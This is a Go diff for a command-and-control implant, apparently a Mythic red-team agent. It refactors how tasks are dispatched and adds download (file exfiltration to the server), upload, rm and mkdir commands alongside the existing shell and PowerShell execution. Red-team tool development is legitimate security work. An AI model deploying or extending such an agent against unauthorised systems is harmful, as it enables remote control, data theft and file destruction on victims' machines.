@@ -13,10 +13,11 @@ import (
 
 // commandEntry is one row of the dispatch table. To add a command, add a
 // row plus a handler here, register it in the container commandSpecs and
-// add it to the C table in agent_code_c/tasks.c.
+// add it to the C table in agent_code_c/tasks.c. Handlers return the
+// response body; dispatch fills TaskID and Completed.
 type commandEntry struct {
 	name string
-	run  func(a *Agent, arg string) (output, status string, exit bool)
+	run  func(a *Agent, t Task) (Response, bool)
 }
 
 var commandTable = []commandEntry{
@@ -24,25 +25,26 @@ var commandTable = []commandEntry{
 	{name: "powershell", run: handlePowershell},
 	{name: "sleep", run: handleSleep},
 	{name: "ls", run: handleLs},
+	{name: "download", run: handleDownload},
+	{name: "upload", run: handleUpload},
+	{name: "rm", run: handleRm},
+	{name: "mkdir", run: handleMkdir},
 	{name: "exit", run: handleExit},
 }
 
 // dispatch runs one task and reports whether the agent must exit afterwards.
 func (a *Agent) dispatch(t Task) (Response, bool) {
-	resp := Response{TaskID: t.ID, Completed: true, Status: "success"}
 	entry := findCommand(t.Command)
 	if entry == nil {
-		resp.Status = "error: unknown command " + t.Command
-		resp.UserOutput = resp.Status
-		return resp, false
+		out := "error: unknown command " + t.Command
+		return Response{TaskID: t.ID, Completed: true, Status: out, UserOutput: out}, false
 	}
 	if !commandAllowed(t.Command) {
-		resp.Status = "error: command " + t.Command + " not included in this build"
-		resp.UserOutput = resp.Status
-		return resp, false
+		out := "error: command " + t.Command + " not included in this build"
+		return Response{TaskID: t.ID, Completed: true, Status: out, UserOutput: out}, false
 	}
-	out, status, exit := entry.run(a, taskArg(t.Parameters))
-	resp.UserOutput, resp.Status = out, status
+	resp, exit := entry.run(a, t)
+	resp.TaskID, resp.Completed = t.ID, true
 	return resp, exit
 }
 
@@ -69,62 +71,82 @@ func commandAllowed(name string) bool {
 	return false
 }
 
-func handleShell(_ *Agent, arg string) (string, string, bool) {
-	out, err := runShell(arg)
-	if err != nil {
-		return out, "error: " + err.Error(), false
-	}
-	return out, "success", false
+func errResponse(err error) (Response, bool) {
+	out := "error: " + err.Error()
+	return Response{UserOutput: out, Status: out}, false
 }
 
-func handlePowershell(_ *Agent, arg string) (string, string, bool) {
-	out, err := runPowershell(arg)
+func handleShell(_ *Agent, t Task) (Response, bool) {
+	out, err := runShell(taskArg(t.Parameters))
 	if err != nil {
-		return out, "error: " + err.Error(), false
+		return Response{UserOutput: out, Status: "error: " + err.Error()}, false
 	}
-	return out, "success", false
+	return Response{UserOutput: out, Status: "success"}, false
 }
 
-func handleSleep(a *Agent, arg string) (string, string, bool) {
-	interval, jitter, err := parseSleep(arg)
+func handlePowershell(_ *Agent, t Task) (Response, bool) {
+	out, err := runPowershell(taskArg(t.Parameters))
 	if err != nil {
-		return err.Error(), "error: " + err.Error(), false
+		return Response{UserOutput: out, Status: "error: " + err.Error()}, false
+	}
+	return Response{UserOutput: out, Status: "success"}, false
+}
+
+func handleSleep(a *Agent, t Task) (Response, bool) {
+	interval, jitter, err := parseSleep(taskArg(t.Parameters))
+	if err != nil {
+		return errResponse(err)
 	}
 	a.interval, a.jitter = interval, jitter
-	return fmt.Sprintf("sleep set to %ds jitter %d%%", interval, jitter), "success", false
+	return Response{
+		UserOutput: fmt.Sprintf("sleep set to %ds jitter %d%%", interval, jitter),
+		Status:     "success",
+	}, false
 }
 
-func handleLs(_ *Agent, arg string) (string, string, bool) {
-	out, err := runLs(arg)
+func handleLs(_ *Agent, t Task) (Response, bool) {
+	text, fb, err := listDir(taskArg(t.Parameters))
 	if err != nil {
-		return "", "error: " + err.Error(), false
+		return errResponse(err)
 	}
-	return out, "success", false
+	return Response{UserOutput: text, Status: "success", FileBrowser: fb}, false
 }
 
-func handleExit(_ *Agent, _ string) (string, string, bool) {
-	return "exiting", "success", true
-}
-
-// runLs lists one directory, one entry per line ("name/" for subdirs).
-func runLs(arg string) (string, error) {
-	dir := strings.TrimSpace(arg)
-	if dir == "" {
-		dir = "."
-	}
-	entries, err := os.ReadDir(dir)
+func handleDownload(a *Agent, t Task) (Response, bool) {
+	out, err := downloadToMythic(t.ID, taskArg(t.Parameters), a.chunkSize(), a.postResponses)
 	if err != nil {
-		return "", err
+		return errResponse(err)
 	}
-	var b strings.Builder
-	for _, e := range entries {
-		b.WriteString(e.Name())
-		if e.IsDir() {
-			b.WriteString("/")
-		}
-		b.WriteString("\n")
+	return Response{UserOutput: out, Status: "success"}, false
+}
+
+func handleUpload(a *Agent, t Task) (Response, bool) {
+	out, err := uploadFromMythic(t.ID, taskParam(t.Parameters, "file"),
+		taskParam(t.Parameters, "remote_path"), a.chunkSize(), a.postResponses)
+	if err != nil {
+		return errResponse(err)
 	}
-	return b.String(), nil
+	return Response{UserOutput: out, Status: "success"}, false
+}
+
+func handleRm(_ *Agent, t Task) (Response, bool) {
+	removed, out, err := removePath(taskArg(t.Parameters))
+	if err != nil {
+		return errResponse(err)
+	}
+	return Response{UserOutput: out, Status: "success", RemovedFiles: &removed}, false
+}
+
+func handleMkdir(_ *Agent, t Task) (Response, bool) {
+	out, err := makeDir(taskArg(t.Parameters))
+	if err != nil {
+		return errResponse(err)
+	}
+	return Response{UserOutput: out, Status: "success"}, false
+}
+
+func handleExit(_ *Agent, _ Task) (Response, bool) {
+	return Response{UserOutput: "exiting", Status: "success"}, true
 }
 
 func runShell(arg string) (string, error) {
